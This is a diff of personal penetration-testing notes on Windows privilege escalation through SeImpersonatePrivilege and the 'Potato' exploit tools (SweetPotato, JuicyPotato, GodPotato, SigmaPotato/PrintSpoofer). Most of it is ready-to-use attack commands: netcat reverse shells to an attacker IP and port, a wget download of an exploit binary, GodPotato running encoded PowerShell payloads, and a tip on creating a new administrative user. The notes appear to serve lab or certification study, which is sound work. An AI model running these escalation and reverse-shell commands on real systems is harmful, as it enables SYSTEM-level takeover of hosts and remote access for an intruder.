@@ -251,24 +251,23 @@ C:\Users\Public\reverseshell.exe
 	- Named pipes:
 		- Allow unrelated processes to share data between each other
 		- If we can coerce a a privileged process into connecting to a controlled named pipe, we can capture the authentication and use `SeImpersonatePrivilege` to impersonate the user account and perform operations in their security context
-		- Sigma Potato (PrintSpoofer)
-			- Coerces NT AUTHORITY/SYSTEM into a named pipe
-			- Must be downloaded somehow
-			- Can be used when we have a user with `SeImpersonatePrivilege`
-			- `wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe`
-			- `.\PrintSpoofer64.exe -i -c powershell.exe`
+			- SweetPotato can be used to reliably exploit this it seems; use the nc reverse shell below
 	- General Potato information:
 		- https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 	- SweetPotato
+		- Apparently just the best potato
 		- https://github.com/CCob/SweetPotato
-			- Precompiled: https://github.com/uknowsec/SweetPotato
-		- Get netcat as well (`/usr/share/windows-resources/binaries/)
+			- Compiled pretty painlessly after cloning the repo in Visual Studio 2022
 		- `.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"` works pretty well
 	- JuicyPotato
 		- https://github.com/ohpe/juicy-potato/releases/tag/v0.1
-		- `C:\Users\Public\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c C:\Users\Public\nc.exe 10.10.14.235 4444 -e cmd.exe" -t *`
+		- `C:\Users\Public\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c {nc.exe_path} {kali_IP} {kali_port} -e cmd.exe" -t *`
 	- GodPotato
 		- Can use for a reverse shell `GodPotato.exe -cmd "cmd /c reverse.exe"`
 			- `GodPotato.exe -cmd "powershell -e ...."`
 		- Can also use it to create a new administrative user, then rdp/winrm in
-
+	- Sigma Potato (PrintSpoofer)
+		- Coerces NT AUTHORITY/SYSTEM into a named pipe
+		- Can be used when we have a user with `SeImpersonatePrivilege`
+		- `wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe`
+		- `.\PrintSpoofer64.exe -i -c powershell.exe`
